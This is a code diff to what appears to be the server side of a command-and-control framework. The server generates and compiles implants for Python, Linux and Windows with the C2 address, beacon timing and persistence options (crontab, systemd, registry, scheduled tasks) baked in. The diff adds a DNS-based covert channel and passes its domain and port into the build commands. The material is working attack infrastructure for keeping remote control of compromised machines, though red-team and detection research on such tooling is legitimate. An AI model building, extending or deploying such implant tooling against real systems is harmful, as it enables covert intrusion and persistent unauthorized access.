@@ -32,6 +32,9 @@ class BuildRequest(BaseModel):
     c2_server: str = ""                 # auto-detected from request if empty
     interval: int = 10
     jitter: float = 0.3
+    communication_channel: str = "http" # "http" | "dns"
+    dns_domain: str = "c2.local"        # domain used for DNS C2 queries
+    dns_port: int = 15353                # DNS server port
 
 
 class AgentGenerateRequest(BaseModel):
@@ -41,6 +44,8 @@ class AgentGenerateRequest(BaseModel):
     interval: int = 60
     jitter: float = 0.3
     communication_channel: str = "http" # "http" | "dns"
+    dns_domain: str = "c2.local"        # domain used for DNS C2 queries
+    dns_port: int = 15353                # DNS server port
     # Persistence mechanism baked in as the default (can still be overridden at runtime)
     persist: str = "none"               # linux: "crontab"|"systemd"|"bashrc"|"none"
                                         # windows: "registry"|"schtask"|"none"
@@ -67,7 +72,8 @@ def _read_client_file(filename: str) -> str:
 
 
 def _inject_config(src: str, c2_server: str, interval: int, jitter: float,
-                   channel: str) -> str:
+                   channel: str, dns_domain: str = "c2.local",
+                   dns_port: int = 15353) -> str:
     """Replace the DEFAULT_* constants in a client source with baked-in values."""
     src = src.replace(
         'DEFAULT_C2_SERVER = os.environ.get("C2_SERVER", "127.0.0.1:8000")',
@@ -85,6 +91,14 @@ def _inject_config(src: str, c2_server: str, interval: int, jitter: float,
         'DEFAULT_COMMUNICATION_CHANNEL = os.environ.get("C2_CHANNEL", "http")',
         f'DEFAULT_COMMUNICATION_CHANNEL = "{channel}"',
     )
+    src = src.replace(
+        'DEFAULT_DNS_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "c2.local")',
+        f'DEFAULT_DNS_DOMAIN = "{dns_domain}"',
+    )
+    src = src.replace(
+        'DEFAULT_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "15353"))',
+        f'DEFAULT_DNS_PORT = {dns_port}',
+    )
     return src
 
 
@@ -95,6 +109,8 @@ def _generate_python_agent(
     jitter: float,
     communication_channel: str,
     persist: str,
+    dns_domain: str = "c2.local",
+    dns_port: int = 15353,
 ) -> str:
     """Build a single-file Python agent with all configuration baked in.
 
@@ -106,7 +122,8 @@ def _generate_python_agent(
 
     # ── Core client ───────────────────────────────────────────────────
     core = _read_client_file("client.py")
-    core = _inject_config(core, c2_server, interval, jitter, communication_channel)
+    core = _inject_config(core, c2_server, interval, jitter, communication_channel,
+                          dns_domain, dns_port)
 
     if os_lower == "cross":
         return core
@@ -160,7 +177,9 @@ def _generate_python_agent(
     return header + core.lstrip() + separator + wrapper.lstrip()
 
 
-def _build_linux(c2_server: str, interval: int, jitter: float) -> str:
+def _build_linux(c2_server: str, interval: int, jitter: float,
+                 channel: str = "http", dns_domain: str = "c2.local",
+                 dns_port: int = 15353) -> str:
     """Compile the C++ client, return path to the ELF binary."""
     src_dir = os.path.join(_CLIENT_ROOT, "linux")
     print(f"Building Linux C2 client for {c2_server}... (src={src_dir})")
@@ -177,6 +196,9 @@ def _build_linux(c2_server: str, interval: int, jitter: float) -> str:
         f'-DC2_DEFAULT_SERVER="{c2_server}"',
         f"-DC2_DEFAULT_INTERVAL={interval}",
         f"-DC2_DEFAULT_JITTER={jitter}",
+        f'-DC2_DEFAULT_CHANNEL="{channel}"',
+        f'-DC2_DEFAULT_DNS_DOMAIN="{dns_domain}"',
+        f"-DC2_DEFAULT_DNS_PORT={dns_port}",
         "-o", os.path.join(tmp, "c2client"),
         os.path.join(tmp, "main.cpp"),
         "-lcurl", "-lpthread",
@@ -204,7 +226,9 @@ def _detect_dotnet_tfm() -> str:
     return "net9.0"
 
 
-def _build_windows(c2_server: str, interval: int, jitter: float) -> str:
+def _build_windows(c2_server: str, interval: int, jitter: float,
+                   channel: str = "http", dns_domain: str = "c2.local",
+                   dns_port: int = 15353) -> str:
     """Compile the .NET client, return path to the .exe."""
     src_dir = os.path.join(_CLIENT_ROOT, "windows")
     if not os.path.isfile(os.path.join(src_dir, "Program.cs")):
@@ -242,6 +266,9 @@ def _build_windows(c2_server: str, interval: int, jitter: float) -> str:
         f"-p:C2Server={c2_server}",
         f"-p:C2Interval={interval}",
         f"-p:C2Jitter={jitter}",
+        f"-p:C2Channel={channel}",
+        f"-p:C2DnsDomain={dns_domain}",
+        f"-p:C2DnsPort={dns_port}",
         "-o", os.path.join(tmp, "out"),
     ]
     result = subprocess.run(cmd, capture_output=True, timeout=300)
@@ -286,6 +313,8 @@ def generate_agent(
         jitter=body.jitter,
         communication_channel=body.communication_channel,
         persist=body.persist,
+        dns_domain=body.dns_domain,
+        dns_port=body.dns_port,
     )
 
     return PlainTextResponse(
@@ -307,14 +336,16 @@ def build_implant(
 
     if "linux" in os_lower:
         print(f"Building Linux C2 client for {c2}...")
-        path = _build_linux(c2, body.interval, body.jitter)
+        path = _build_linux(c2, body.interval, body.jitter,
+                            body.communication_channel, body.dns_domain, body.dns_port)
         return FileResponse(
             path,
             media_type="application/octet-stream",
             filename="c2client",
         )
     elif "windows" in os_lower or "win" in os_lower:
-        path = _build_windows(c2, body.interval, body.jitter)
+        path = _build_windows(c2, body.interval, body.jitter,
+                              body.communication_channel, body.dns_domain, body.dns_port)
         return FileResponse(
             path,
             media_type="application/octet-stream",
